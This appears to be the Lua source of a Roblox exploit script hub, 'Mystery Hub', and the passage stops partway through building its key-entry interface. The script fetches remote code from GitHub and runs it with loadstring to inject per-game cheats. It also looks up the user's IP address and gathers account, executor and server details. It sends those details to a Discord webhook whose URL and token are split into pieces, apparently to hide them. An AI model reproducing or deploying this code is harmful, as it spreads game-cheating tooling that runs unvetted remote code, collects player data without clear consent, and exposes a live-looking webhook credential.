local MH = getgenv().MH or {}
getgenv().MH = MH

MH.S = MH.S or {}
MH.V = MH.V or {}
MH.D = MH.D or {}
MH.C = MH.C or {}
MH.H = MH.H or {}
MH.St = MH.St or {}
MH.R = MH.R or {}

local S = MH.S
local V = MH.V
local D = MH.D
local C = MH.C
local H = MH.H
local St = MH.St
local R = MH.R

S.Players = game:GetService("Players")
S.TweenService = game:GetService("TweenService")
S.Lighting = game:GetService("Lighting")
S.RunService = game:GetService("RunService")
S.UserInputService = game:GetService("UserInputService")
S.HttpService = game:GetService("HttpService")
S.MarketplaceService = game:GetService("MarketplaceService")
S.LocalPlayer = S.Players.LocalPlayer
S.Camera = workspace.CurrentCamera

V.AccentIndex = V.AccentIndex or 1
V.BlurEnabled = V.BlurEnabled or false
V.ParticlesEnabled = V.ParticlesEnabled or true
V.CompactMode = V.CompactMode or false
V.ReducedMotion = V.ReducedMotion or false
V.ScriptVersion = V.ScriptVersion or "v1.2.0"

St.ParticleGen = St.ParticleGen or 0

D.Accents = D.Accents or {
	{Name = "Violet", Accent = Color3.fromRGB(155, 79, 224), Accent2 = Color3.fromRGB(199, 116, 240)},
	{Name = "Orchid", Accent = Color3.fromRGB(166, 58, 201), Accent2 = Color3.fromRGB(226, 111, 224)},
	{Name = "Indigo", Accent = Color3.fromRGB(108, 92, 231), Accent2 = Color3.fromRGB(157, 140, 245)},
	{Name = "Grape", Accent = Color3.fromRGB(126, 34, 206), Accent2 = Color3.fromRGB(176, 109, 224)},
	{Name = "Amethyst", Accent = Color3.fromRGB(139, 63, 168), Accent2 = Color3.fromRGB(214, 143, 232)}
}

D.Palette = D.Palette or {
	BgDeep = Color3.fromRGB(10, 5, 18),
	Panel = Color3.fromRGB(23, 12, 34),
	PanelAlt = Color3.fromRGB(29, 16, 41),
	PanelRaised = Color3.fromRGB(36, 21, 51),
	Border = Color3.fromRGB(58, 33, 80),
	BorderSoft = Color3.fromRGB(42, 23, 64),
	Text = Color3.fromRGB(239, 231, 247),
	TextDim = Color3.fromRGB(168, 148, 194),
	TextFaint = Color3.fromRGB(111, 92, 138),
	Ok = Color3.fromRGB(57, 201, 138)
}

D.DiscordInvite = "https://discord.gg/yBfnjRHKnd"
D.ValidKey = "MHONTOP"
D.GamesUrl = "https://raw.githubusercontent.com/Mystery-Center/Mystery-Control/refs/heads/main/Games.lua"
D.BlacklistUrl = "https://raw.githubusercontent.com/Mystery-Center/Mystery-Control/refs/heads/main/Blacklist.json"
D.WhitelistUrl = "https://raw.githubusercontent.com/Mystery-Center/Mystery-Control/refs/heads/main/Whitelist.json"
D.IconsUrl = "https://raw.githubusercontent.com/Mystery-Center/Mystery-Control/refs/heads/main/Icons.lua"

D.IconFallbacks = {
	settings = "\u{2699}",
	x = "\u{2715}",
	user = "\u{1F464}",
	["message-circle"] = "\u{1F4AC}",
	sparkles = "\u{2726}"
}

local WebhookParts = {
	"https://discord.com/api/webhooks/",
	"1553345545337053314/",
	"rJkta54BR1WjeGiuFus--foCi_Cj02IJJP59Wll6Jjg3vQN4DF8IVwljZ",
	"BClF2KDguyo"
}
D.WebhookUrl = table.concat(WebhookParts)

function H.New(className, props, children)
	local inst = Instance.new(className)
	for key, value in pairs(props or {}) do
		inst[key] = value
	end
	for _, child in ipairs(children or {}) do
		child.Parent = inst
	end
	return inst
end

function H.Corner(parent, radius)
	return H.New("UICorner", {CornerRadius = UDim.new(0, radius), Parent = parent})
end

function H.Stroke(parent, color, thickness)
	return H.New("UIStroke", {Color = color, Thickness = thickness or 1, Parent = parent})
end

function H.Gradient(parent, colorA, colorB, rotation)
	return H.New("UIGradient", {
		Color = ColorSequence.new(colorA, colorB),
		Rotation = rotation or 45,
		Parent = parent
	})
end

function H.Padding(parent, top, bottom, left, right)
	return H.New("UIPadding", {
		PaddingTop = UDim.new(0, top or 0),
		PaddingBottom = UDim.new(0, bottom or 0),
		PaddingLeft = UDim.new(0, left or 0),
		PaddingRight = UDim.new(0, right or 0),
		Parent = parent
	})
end

function H.Tween(instance, props, duration, style, direction)
	local info = TweenInfo.new(duration or 0.18, style or Enum.EasingStyle.Quad, direction or Enum.EasingDirection.Out)
	local tween = S.TweenService:Create(instance, info, props)
	tween:Play()
	return tween
end

function H.SetClipboard(text)
	local ok = pcall(function()
		setclipboard(text)
	end)
	if ok then
		return true
	end
	local fallbackOk = pcall(function()
		toclipboard(text)
	end)
	return fallbackOk
end

function H.GetExecutorInfo()
	local ok, name, version = pcall(function()
		return identifyexecutor()
	end)
	if ok and name then
		return name, version or "?"
	end
	if syn then
		return "Synapse X", "?"
	end
	if KRNL_LOADED then
		return "KRNL", "?"
	end
	if rconsoleprint then
		return "Script-Ware", "?"
	end
	return "Unknown", "?"
end

function H.GetPlatform()
	if S.UserInputService.TouchEnabled and not S.UserInputService.KeyboardEnabled then
		return "Mobile"
	end
	if S.UserInputService.GamepadEnabled then
		return "Console"
	end
	return "PC"
end

function H.FormatAccountAge(days)
	local years = math.floor(days / 365)
	local remainder = days - (years * 365)
	if years > 0 then
		return years .. "y " .. remainder .. "d"
	end
	return days .. "d"
end

function H.GetGui()
	local ok, hidden = pcall(function()
		return gethui()
	end)
	if ok and hidden then
		return hidden
	end
	local coreOk, core = pcall(function()
		return game:GetService("CoreGui")
	end)
	if coreOk and core then
		return core
	end
	return S.LocalPlayer:WaitForChild("PlayerGui")
end

function H.FetchJSON(url)
	local ok, raw = pcall(function()
		return game:HttpGet(url)
	end)
	if not ok or raw == "" then
		return nil
	end
	local decodeOk, data = pcall(function()
		return S.HttpService:JSONDecode(raw)
	end)
	if not decodeOk then
		return nil
	end
	return data
end

function H.LoadIconPack()
	if St.IconPack ~= nil then
		return St.IconPack ~= false and St.IconPack or nil
	end
	St.IconPack = false
	local ok, pack = pcall(function()
		return loadstring(game:HttpGet(D.IconsUrl))()
	end)
	if ok and type(pack) == "table" then
		St.IconPack = pack
		return pack
	end
	return nil
end

-- Normalises whatever shape the pack returns into {Image=, RectOffset=, RectSize=}
function H.ResolveIcon(name, size)
	local pack = H.LoadIconPack()
	if not pack then
		return nil
	end
	size = size or 48

	local function fromEntry(entry)
		if type(entry) == "string" then
			return {Image = entry}
		end
		if type(entry) == "number" then
			return {Image = "rbxassetid://" .. tostring(entry)}
		end
		if type(entry) ~= "table" then
			return nil
		end
		local image = entry.Image or entry.image or entry.url or entry.Url or entry.asset or entry.Asset or entry[1]
		if type(image) == "number" then
			image = "rbxassetid://" .. tostring(image)
		end
		if type(image) ~= "string" or image == "" then
			return nil
		end
		local offset = entry.ImageRectOffset or entry.RectOffset or entry.offset or entry[2]
		local rect = entry.ImageRectSize or entry.RectSize or entry.size or entry[3]
		local resolved = {Image = image}
		if typeof(offset) == "Vector2" then
			resolved.RectOffset = offset
		elseif type(offset) == "table" and offset.X and offset.Y then
			resolved.RectOffset = Vector2.new(offset.X, offset.Y)
		end
		if typeof(rect) == "Vector2" then
			resolved.RectSize = rect
		elseif type(rect) == "table" and rect.X and rect.Y then
			resolved.RectSize = Vector2.new(rect.X, rect.Y)
		end
		return resolved
	end

	-- Shape 1: function-style accessors, tried as a plain call and as a method
	for _, fnName in ipairs({"GetAsset", "getAsset", "Get", "get", "Icon", "icon"}) do
		local fn = pack[fnName]
		if type(fn) == "function" then
			local attempts = {
				function()
					return fn(name, size)
				end,
				function()
					return fn(pack, name, size)
				end
			}
			for _, attempt in ipairs(attempts) do
				local callOk, result = pcall(attempt)
				if callOk then
					local resolved = fromEntry(result)
					if resolved then
						return resolved
					end
				end
			end
		end
	end

	-- Shape 2: size-bucketed table, e.g. pack["48px"][name] or pack[48][name]
	for _, key in ipairs({size, tostring(size), tostring(size) .. "px"}) do
		local bucket = pack[key]
		if type(bucket) == "table" then
			local resolved = fromEntry(bucket[name])
			if resolved then
				return resolved
			end
		end
	end

	-- Shape 3: flat name -> asset map, optionally nested under Icons
	local flat = pack.Icons or pack.icons or pack
	if type(flat) == "table" then
		local resolved = fromEntry(flat[name])
		if resolved then
			return resolved
		end
	end

	return nil
end

function H.LoadGamesTable()
	local ok, result = pcall(function()
		return loadstring(game:HttpGet(D.GamesUrl))()
	end)
	if ok and type(result) == "table" then
		return result
	end
	return nil
end

function H.GetClientIP()
	if St.ClientIP ~= nil then
		return St.ClientIP ~= false and St.ClientIP or nil
	end
	St.ClientIP = false
	local req = syn and syn.request or http_request or request
	local endpoints = {
		"https://api.ipify.org?format=json",
		"https://ipinfo.io/json"
	}
	for _, url in ipairs(endpoints) do
		local ok, body = pcall(function()
			if req then
				local res = req({Url = url, Method = "GET"})
				return type(res) == "table" and res.Body or nil
			end
			return game:HttpGet(url)
		end)
		if ok and type(body) == "string" and body ~= "" then
			local decodeOk, data = pcall(function()
				return S.HttpService:JSONDecode(body)
			end)
			local found = nil
			if decodeOk and type(data) == "table" and type(data.ip) == "string" then
				found = data.ip
			else
				found = body:match("%d+%.%d+%.%d+%.%d+")
			end
			if type(found) == "string" and found ~= "" then
				St.ClientIP = (found:gsub("%s", ""))
				return St.ClientIP
			end
		end
	end
	return nil
end

local function normIP(value)
	if type(value) ~= "string" then
		return nil
	end
	local cleaned = value:gsub("%s", ""):lower()
	if cleaned == "" then
		return nil
	end
	return cleaned
end

local function looksLikeIP(value)
	local cleaned = normIP(value)
	if not cleaned then
		return false
	end
	if cleaned:match("^%d+%.%d+%.%d+%.[%d%*]+$") then
		return true
	end
	return cleaned:find(":") ~= nil
end

local function ipMatches(pattern, ip)
	if not pattern or not ip then
		return false
	end
	if pattern == ip then
		return true
	end
	local prefix = pattern:match("^(.-)%*$")
	if prefix and prefix ~= "" then
		return ip:sub(1, #prefix) == prefix
	end
	return false
end

function H.CheckBlacklisted()
	local list = H.FetchJSON(D.BlacklistUrl)
	if type(list) ~= "table" then
		return false
	end

	local myId = S.LocalPlayer.UserId
	local defaultReason = "You have been blacklisted from Mystery Hub."
	local ipRules = {}
	local hitReason = nil

	local function addUser(value, reason)
		if not hitReason and tonumber(value) == myId then
			hitReason = reason or defaultReason
		end
	end

	local function addIP(value, reason)
		local cleaned = normIP(value)
		if cleaned then
			table.insert(ipRules, {Pattern = cleaned, Reason = reason})
		end
	end

	local function ingest(entry, kind)
		if type(entry) == "number" then
			addUser(entry)
		elseif type(entry) == "string" then
			if kind == "ip" or looksLikeIP(entry) then
				addIP(entry)
			else
				addUser(entry)
			end
		elseif type(entry) == "table" then
			local reason = entry.Reason or entry.reason
			local uid = entry.UserId or entry.userId or entry.userid or entry.id
			local ip = entry.IP or entry.ip or entry.Ip
			if uid then
				addUser(uid, reason)
			end
			if ip then
				addIP(ip, reason)
			end
		end
	end

	for _, entry in ipairs(list.users or list.Users or {}) do
		ingest(entry, "user")
	end
	for _, entry in ipairs(list.ips or list.IPs or list.Ips or {}) do
		ingest(entry, "ip")
	end
	for _, entry in ipairs(list) do
		ingest(entry)
	end

	if hitReason then
		return true, hitReason
	end

	if #ipRules > 0 then
		local myIP = normIP(H.GetClientIP())
		if myIP then
			for _, rule in ipairs(ipRules) do
				if ipMatches(rule.Pattern, myIP) then
					return true, rule.Reason or defaultReason
				end
			end
		end
	end

	return false
end

function H.CheckWhitelisted()
	local list = H.FetchJSON(D.WhitelistUrl)
	if type(list) ~= "table" then
		return false
	end
	local myName = string.lower(S.LocalPlayer.Name)
	for _, entry in ipairs(list) do
		if type(entry) == "string" and entry ~= "" and string.lower(entry) == myName then
			return true
		end
	end
	return false
end

function H.GetAvatarThumbnailContent()
	local ok, content = pcall(function()
		return S.Players:GetUserThumbnailAsync(S.LocalPlayer.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
	end)
	if ok then
		return content
	end
	return nil
end

function H.GetAvatarHttpUrl()
	local userId = tostring(S.LocalPlayer.UserId)
	local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
	local data = H.FetchJSON("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. userId .. "&size=420x420&format=Png")
	if type(data) == "table" and data.data and data.data[1] and data.data[1].imageUrl then
		avatarUrl = data.data[1].imageUrl
	end
	return avatarUrl
end

function H.SendLog(status)
	local execName, execVersion = H.GetExecutorInfo()
	local userId = tostring(S.LocalPlayer.UserId)
	local username = S.LocalPlayer.Name
	local displayName = S.LocalPlayer.DisplayName
	local profileUrl = "https://www.roblox.com/users/" .. userId .. "/profile"
	local placeId = tostring(game.PlaceId)
	local gameUrl = "https://www.roblox.com/games/" .. placeId
	local gameName = "Unknown"

	local infoOk, info = pcall(function()
		return S.MarketplaceService:GetProductInfo(game.PlaceId)
	end)
	if infoOk and info and info.Name then
		gameName = info.Name
	end

	local jobId = tostring(game.JobId)
	local jobIdShort = jobId
	if #jobId > 18 then
		jobIdShort = jobId:sub(1, 18) .. "..."
	end

	local membership = "No Premium"
	if S.LocalPlayer.MembershipType == Enum.MembershipType.Premium then
		membership = "Premium"
	end

	local descriptionParts = {
		"**Player Info**",
		"Username: [" .. username .. "](" .. profileUrl .. ")",
		"Display Name: " .. displayName,
		"User ID: " .. userId,
		"Account Age: " .. H.FormatAccountAge(S.LocalPlayer.AccountAge),
		"Membership: " .. membership,
		"Platform: " .. H.GetPlatform(),
		"",
		"**Executor**",
		"Name: " .. execName,
		"Version: " .. execVersion,
		"",
		"**Game Info**",
		"Game: [" .. gameName .. "](" .. gameUrl .. ")",
		"Game ID: " .. tostring(game.GameId),
		"Place ID: " .. placeId,
		"Server ID: " .. jobIdShort,
		"Players: " .. #S.Players:GetPlayers() .. " / " .. S.Players.MaxPlayers,
		"",
		"**Access**",
		"Status: " .. status
	}

	getgenv().MysteryHubCount = (getgenv().MysteryHubCount or 0) + 1

	local payload = {
		username = "Mystery Hub",
		embeds = {
			{
				title = "Mystery Hub Executed",
				description = table.concat(descriptionParts, "\n"),
				color = 10181046,
				thumbnail = {url = H.GetAvatarHttpUrl()},
				footer = {text = "Mystery Hub Logger \u{2022} Execution #" .. getgenv().MysteryHubCount},
				timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
			}
		}
	}

	local ok, err = pcall(function()
		local body = S.HttpService:JSONEncode(payload)
		local req = syn and syn.request or http_request or request
		if req then
			local response = req({
				Url = D.WebhookUrl,
				Method = "POST",
				Headers = {["Content-Type"] = "application/json"},
				Body = body
			})
			if type(response) == "table" and response.StatusCode and (response.StatusCode < 200 or response.StatusCode >= 300) then
				error("webhook responded with status " .. tostring(response.StatusCode) .. " " .. tostring(response.StatusMessage))
			end
		else
			S.HttpService:PostAsync(D.WebhookUrl, body, Enum.HttpContentType.ApplicationJson)
		end
	end)
	if not ok then
		H.Notify("Mystery Hub logger failed: " .. tostring(err), 5)
	end
	return ok
end

function H.RunGameScript(notify)
	local games = H.LoadGamesTable()
	if not games then
		notify("Could not reach the Mystery Hub registry")
		return false
	end
	local url = games[game.GameId] or games[game.PlaceId]
	if not url then
		notify("This game isn't supported yet")
		return false
	end
	local expectedCalc = (game.PlaceId * 7 + S.LocalPlayer.UserId * 13) % 1000000
	getgenv()._MYSTERYHUB_AUTH = {
		Key = D.ValidKey,
		UserId = S.LocalPlayer.UserId,
		PlaceId = game.PlaceId,
		Calc = expectedCalc
	}
	local runOk = pcall(function()
		loadstring(game:HttpGet(url))()
	end)
	getgenv()._MYSTERYHUB_AUTH = nil
	if not runOk then
		notify("Failed to load the script for this game")
		return false
	end
	return true
end

-- Swaps a TextButton/TextLabel's glyph for a Lucide icon, keeping the glyph if the pack misses.
function H.ApplyIcon(target, name, pixelSize, color)
	local resolveOk, resolved = pcall(H.ResolveIcon, name, 48)
	if not resolveOk then
		resolved = nil
	end
	if not resolved then
		if D.IconFallbacks[name] and (target:IsA("TextLabel") or target:IsA("TextButton")) then
			target.Text = D.IconFallbacks[name]
		end
		return nil
	end

	local existing = target:FindFirstChild("LucideIcon")
	if existing then
		existing:Destroy()
	end

	local inheritedColor = color
	if not inheritedColor and (target:IsA("TextButton") or target:IsA("TextLabel")) then
		inheritedColor = target.TextColor3
	end

	target.Text = ""
	pixelSize = pixelSize or 16

	local props = {
		Name = "LucideIcon",
		Image = resolved.Image,
		ImageColor3 = inheritedColor or D.Palette.TextDim,
		BackgroundTransparency = 1,
		AnchorPoint = Vector2.new(0.5, 0.5),
		Position = UDim2.new(0.5, 0, 0.5, 0),
		Size = UDim2.new(0, pixelSize, 0, pixelSize),
		ScaleType = Enum.ScaleType.Fit,
		Parent = target
	}
	if resolved.RectOffset then
		props.ImageRectOffset = resolved.RectOffset
	end
	if resolved.RectSize then
		props.ImageRectSize = resolved.RectSize
	end

	return H.New("ImageLabel", props)
end

function H.Notify(message, duration)
	duration = duration or 2.5
	local gui = H.New("ScreenGui", {
		Name = "MysteryHubNotify",
		ResetOnSpawn = false,
		DisplayOrder = 60,
		Parent = H.GetGui()
	})
	local label = H.New("TextLabel", {
		AnchorPoint = Vector2.new(0.5, 0.5),
		Position = UDim2.new(0.5, 0, 0.5, 0),
		Size = UDim2.new(0, 440, 0, 50),
		BackgroundTransparency = 1,
		Text = message,
		Font = Enum.Font.GothamBold,
		TextSize = 18,
		TextColor3 = D.Accents[1].Accent2,
		TextStrokeTransparency = 0.4,
		TextTransparency = 1,
		TextWrapped = true,
		Parent = gui
	})
	H.Tween(label, {TextTransparency = 0}, 0.3)
	task.delay(duration, function()
		H.Tween(label, {TextTransparency = 1}, 0.3)
		task.delay(0.35, function()
			gui:Destroy()
		end)
	end)
end

local isBlacklisted, blacklistReason = H.CheckBlacklisted()
if isBlacklisted then
	blacklistReason = blacklistReason or "You have been blacklisted from Mystery Hub."
	H.Notify(blacklistReason, 4)
	pcall(function()
		S.LocalPlayer:Kick(blacklistReason)
	end)
	return
end

if getgenv()._MYSTERYHUB_KEY_OK or H.CheckWhitelisted() then
	local wasAlreadyUnlocked = getgenv()._MYSTERYHUB_KEY_OK
	getgenv()._MYSTERYHUB_KEY_OK = true
	local status = "Whitelisted Auto-Run"
	if wasAlreadyUnlocked then
		status = "Auto-Run"
	end
	H.SendLog(status)
	H.RunGameScript(function(message)
		H.Notify(message, 3)
	end)
	return
end

local Palette = D.Palette
local AvatarThumb = H.GetAvatarThumbnailContent()

R.ScreenGui = H.New("ScreenGui", {
	Name = "MysteryHubKeyUI",
	ResetOnSpawn = false,
	ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
	DisplayOrder = 50,
	Parent = H.GetGui()
})

R.Layout = H.New("Frame", {
	Name = "Layout",
	BackgroundTransparency = 1,
	AnchorPoint = Vector2.new(0.5, 0.5),
	Position = UDim2.new(0.5, 0, 0.5, 0),
	Size = UDim2.new(0, 0, 0, 0),
	AutomaticSize = Enum.AutomaticSize.XY,
	Parent = R.ScreenGui
})

R.LayoutScale = H.New("UIScale", {Scale = 1, Parent = R.Layout})

R.LayoutList = H.New("UIListLayout", {
	FillDirection = Enum.FillDirection.Horizontal,
	HorizontalAlignment = Enum.HorizontalAlignment.Center,
	VerticalAlignment = Enum.VerticalAlignment.Top,
	Padding = UDim.new(0, 20),
	SortOrder = Enum.SortOrder.LayoutOrder,
	Parent = R.Layout
})

R.ParticleLayer = H.New("Frame", {
	Name = "ParticleLayer",
	BackgroundTransparency = 1,
	AnchorPoint = Vector2.new(0.5, 1),
	Position = UDim2.new(0.5, 0, 1, 0),
	Size = UDim2.new(1, 0, 1, 0),
	ZIndex = 0,
	Parent = R.ScreenGui
})

local function buildAvatarFrame(size, parent)
	local frame = H.New("Frame", {
		Name = "Avatar",
		Size = UDim2.new(0, size, 0, size),
		BackgroundColor3 = D.Accents[1].Accent,
		ClipsDescendants = true,
		Parent = parent
	})
	H.Corner(frame, size / 2)
	H.Gradient(frame, D.Accents[1].Accent2, D.Accents[1].Accent, 135)
	H.Stroke(frame, Color3.fromRGB(255, 255, 255), 1).Transparency = 0.85
	local fallback = H.New("TextLabel", {
		Name = "Fallback",
		Text = "MH",
		Font = Enum.Font.GothamBold,
		TextSize = math.floor(size * 0.32),
		TextColor3 = Color3.fromRGB(255, 255, 255),
		BackgroundTransparency = 1,
		Size = UDim2.new(1, 0, 1, 0),
		Parent = frame
	})
	if AvatarThumb then
		fallback.Visible = false
		H.New("ImageLabel", {
			Name = "Photo",
			Image = AvatarThumb,
			ScaleType = Enum.ScaleType.Crop,
			BackgroundTransparency = 1,
			Size = UDim2.new(1, 0, 1, 0),
			Parent = frame
		})
	end
	return frame
end

local function buildPanel(name, layoutOrder, width)
	local panel = H.New("Frame", {
		Name = name,
		LayoutOrder = layoutOrder,
		Size = UDim2.new(0, width, 0, 0),
		AutomaticSize = Enum.AutomaticSize.Y,
		BackgroundColor3 = Palette.Panel,
		Visible = false,
		Parent = R.Layout
	})
	H.Corner(panel, 18)
	H.Stroke(panel, Palette.Border, 1)
	H.New("UIListLayout", {
		SortOrder = Enum.SortOrder.LayoutOrder,
		Padding = UDim.new(0, 8),
		Parent = panel
	})
	H.Padding(panel, 0, 16, 0, 0)
	return panel
end

local function buildHeader(parent, title, order)
	local head = H.New("Frame", {
		Name = "Header",
		LayoutOrder = order,
		BackgroundTransparency = 1,
		Size = UDim2.new(1, 0, 0, 46),
		Parent = parent
	})
	H.New("TextLabel", {
		Text = title,
		Font = Enum.Font.GothamBold,
		TextSize = 15,
		TextColor3 = Palette.Text,
		TextXAlignment = Enum.TextXAlignment.Left,
		BackgroundTransparency = 1,
		Position = UDim2.new(0, 16, 0, 0),
		Size = UDim2.new(1, -60, 1, 0),
		Parent = head
	})
	local closeBtn = H.New("TextButton", {
		Name = "CloseButton",
		Text = "\u{2715}",
		Font = Enum.Font.GothamBold,
		TextSize = 13,
		TextColor3 = Palette.TextDim,
		BackgroundColor3 = Palette.PanelRaised,
		AnchorPoint = Vector2.new(1, 0.5),
		Position = UDim2.new(1, -14, 0.5, 0),
		Size = UDim2.new(0, 28, 0, 28),
		Parent = head
	})
	H.Corner(closeBtn, 9)
	H.Stroke(closeBtn, Palette.BorderSoft, 1)
	H.ApplyIcon(closeBtn, "x", 14)
	return head, closeBtn
end

R.SettingsPanel = buildPanel("SettingsPanel", 1, 280)
R.KeyWidget = H.New("Frame", {
	Name = "KeyWidget",
	LayoutOrder = 2,
	Size = UDim2.new(0, 320, 0, 0),
	AutomaticSize = Enum.AutomaticSize.Y,
	BackgroundColor3 = Palette.Panel,
	Visible = true,
	Parent = R.Layout
})
H.Corner(R.KeyWidget, 18)
H.Stroke(R.KeyWidget, Palette.Border, 1)
R.BodyList = H.New("UIListLayout", {
	SortOrder = Enum.SortOrder.LayoutOrder,
	HorizontalAlignment = Enum.HorizontalAlignment.Center,
	Padding = UDim.new(0, 14),
	Parent = R.KeyWidget
})
R.BodyPadding = H.Padding(R.KeyWidget, 16, 20, 24, 24)
R.UserPanel = buildPanel("UserPanel", 3, 280)

local settingsHeader, closeSettingsBtn = buildHeader(R.SettingsPanel, "Appearance", 1)

R.SwatchRow = H.New("Frame", {
	Name = "SwatchRow",
	LayoutOrder = 2,
	BackgroundTransparency = 1,
	Size = UDim2.new(1, 0, 0, 28),
	Parent = R.SettingsPanel
})
H.Padding(R.SwatchRow, 0, 0, 16, 16)

H.New("UIListLayout", {
	FillDirection = Enum.FillDirection.Horizontal,
	Padding = UDim.new(0, 10),
	SortOrder = Enum.SortOrder.LayoutOrder,
	Parent = R.SwatchRow
})

R.Swatches = {}

for index, accent in ipairs(D.Accents) do
	local swatch = H.New("TextButton", {
		Name = "Swatch" .. index,
		Text = "",
		BackgroundColor3 = accent.Accent,
		Size = UDim2.new(0, 28, 0, 28),
		LayoutOrder = index,
		Parent = R.SwatchRow
	})
	H.Corner(swatch, 14)
	H.Gradient(swatch, accent.Accent2, accent.Accent, 120)
	local ring = H.Stroke(swatch, Color3.fromRGB(255, 255, 255), 2)
	ring.Transparency = index == 1 and 0 or 1
	R.Swatches[index] = {Button = swatch, Ring = ring}
end

local function buildToggleRow(parent, order, label, subLabel)
	local row = H.New("Frame", {
		BackgroundTransparency = 1,
		LayoutOrder = order,
		Size = UDim2.new(1, 0, 0, 46),
		Parent = parent
	})
	local textHolder = H.New("Frame", {
		BackgroundTransparency = 1,
		Size = UDim2.new(1, -50, 1, 0),
		Parent = row
	})
	H.New("TextLabel", {
		Text = label,
		Font = Enum.Font.Gotham,
		TextSize = 13,
		TextColor3 = Palette.Text,
		TextXAlignment = Enum.TextXAlignment.Left,
		BackgroundTransparency = 1,
		Size = UDim2.new(1, 0, 0, 18),
		Parent = textHolder
	})
	H.New("TextLabel", {
		Text = subLabel,
		Font = Enum.Font.Gotham,
		TextSize = 11,
		TextColor3 = Palette.TextFaint,
		TextXAlignment = Enum.TextXAlignment.Left,
		BackgroundTransparency = 1,
		Position = UDim2.new(0, 0, 0, 18),
		Size = UDim2.new(1, 0, 0, 14),
		Parent = textHolder
	})
	local toggle = H.New("TextButton", {
		Name = "Toggle",
		Text = "",
		BackgroundColor3 = Palette.BorderSoft,
		AnchorPoint = Vector2.new(1, 0.5),
		Position = UDim2.new(1, 0, 0.5, 0),
		Size = UDim2.new(0, 40, 0, 22),
		Parent = row
	})
	H.Corner(toggle, 11)
	local knob = H.New("Frame", {
		Name = "Knob",
		BackgroundColor3 = Color3.fromRGB(203, 185, 230),
		Position = UDim2.new(0, 2, 0, 2),
		Size = UDim2.new(0, 18, 0, 18),
		Parent = toggle
	})
	H.Corner(knob, 9)
	return row, toggle, knob
end

R.SettingsList = H.New("Frame", {
	Name = "SettingsList",
	LayoutOrder = 3,
	BackgroundTransparency = 1,
	Size = UDim2.new(1, 0, 0, 0),
	AutomaticSize = Enum.AutomaticSize.Y,
	Parent = R.SettingsPanel
})
H.Padding(R.SettingsList, 0, 0, 16, 16)

H.New("UIListLayout", {
	Padding = UDim.new(0, 2),
	SortOrder = Enum.SortOrder.LayoutOrder,
	Parent = R.SettingsList
})

local _, blurToggle, blurKnob = buildToggleRow(R.SettingsList, 1, "Enable blur", "Softens the background")
local _, particlesToggle, particlesKnob = buildToggleRow(R.SettingsList, 2, "Show particles", "Floating ambient motes")
local _, compactToggle, compactKnob = buildToggleRow(R.SettingsList, 3, "Compact mode", "Tighter spacing")
local _, motionToggle, motionKnob = buildToggleRow(R.SettingsList, 4, "Reduced motion", "Turns off animations")

local widgetTopBar = H.New("Frame", {
	Name = "TopBar",
	LayoutOrder = 1,
	BackgroundTransparency = 1,
	Size = UDim2.new(1, 0, 0, 30),
	Parent = R.KeyWidget
})

H.New("UIListLayout", {
	FillDirection = Enum.FillDirection.Horizontal,
	HorizontalAlignment = Enum.HorizontalAlignment.Right,
	VerticalAlignment = Enum.VerticalAlignment.Center,
	Padding = UDim.new(0, 8),
	SortOrder = Enum.SortOrder.LayoutOrder,
	Parent = widgetTopBar
})

local settingsBtn = H.New("TextButton", {
	Text = "\u{2699}",
	Font = Enum.Font.GothamBold,
	TextSize = 14,
	TextColor3 = Palette.TextDim,
	BackgroundColor3 = Palette.PanelRaised,
	LayoutOrder = 1,
	Size = UDim2.new(0, 30, 0, 30),
	Parent = widgetTopBar
})
H.Corner(settingsBtn, 10)
H.Stroke(settingsBtn, Palette.BorderSoft, 1)
H.ApplyIcon(settingsBtn, "settings", 16)

local mainCloseBtn = H.New("TextButton", {
	Text = "\u{2715}",
	Font = Enum.Font.GothamBold,
	TextSize = 13,
	TextColor3 = Palette.TextDim,
	BackgroundColor3 = Palette.PanelRaised,
	LayoutOrder = 2,
	Size = UDim2.new(0, 30, 0, 30),
	Parent = widgetTopBar
})
H.Corner(mainCloseBtn, 10)
H.Stroke(mainCloseBtn, Palette.BorderSoft, 1)
H.ApplyIcon(mainCloseBtn, "x", 15)

R.Avatar = buildAvatarFrame(64, R.KeyWidget)
R.Avatar.LayoutOrder = 2

R.Title = H.New("TextLabel", {
	Text = "Mystery Hub",
	Font = Enum.Font.GothamBold,
	TextSize = 21,
	TextColor3 = Palette.Text,
	BackgroundTransparency = 1,
	LayoutOrder = 3,
	Size = UDim2.new(1, 0, 0, 26),
	Parent = R.KeyWidget
})

R.StatusRow = H.New("Frame", {
	Name = "StatusRow",
	LayoutOrder = 4,
	BackgroundTransparency = 1,
	AutomaticSize = Enum.AutomaticSize.X,
	Size = UDim2.new(0, 0, 0, 20),
	Parent = R.KeyWidget
})

H.New("UIListLayout", {
	FillDirection = Enum.FillDirection.Horizontal,
	VerticalAlignment = Enum.VerticalAlignment.Center,
	Padding = UDim.new(0, 7),
	SortOrder = Enum.SortOrder.LayoutOrder,
	Parent = R.StatusRow
})

R.StatusDot = H.New("Frame", {
	Size = UDim2.new(0, 8, 0, 8),
	BackgroundColor3 = D.Accents[1].Accent2,
	LayoutOrder = 1,
	Parent = R.StatusRow
})
H.Corner(R.StatusDot, 4)

R.StatusLabel = H.New("TextLabel", {
	Text = "Enter your key to continue",
	Font = Enum.Font.Gotham,
	TextSize = 13,
	TextColor3 = D.Accents[1].Accent2,
	BackgroundTransparency = 1,
	AutomaticSize = Enum.AutomaticSize.X,
	Size = UDim2.new(0, 0, 0, 18),
	LayoutOrder = 2,
	Parent = R.StatusRow
})

R.KeyInputHolder = H.New("Frame", {
	Name = "KeyInputHolder",
	LayoutOrder = 5,
	Size = UDim2.new(1, 0, 0, 44),
	BackgroundColor3 = Palette.BgDeep,
	Parent = R.KeyWidget
})
H.Corner(R.KeyInputHolder, 12)
R.KeyInputStroke = H.Stroke(R.KeyInputHolder, D.Accents[1].Accent, 1)

R.KeyInput = H.New("TextBox", {
	Text = "",
	PlaceholderText = "Enter your key...",
	Font = Enum.Font.Gotham,
	TextSize = 14,
	TextColor3 = Palette.Text,
	PlaceholderColor3 = Palette.TextFaint,
	ClearTextOnFocus = false,
	BackgroundTransparency = 1,
	Position = UDim2.new(0, 14, 0, 0),
	Size = UDim2.new(1, -28, 1, 0),
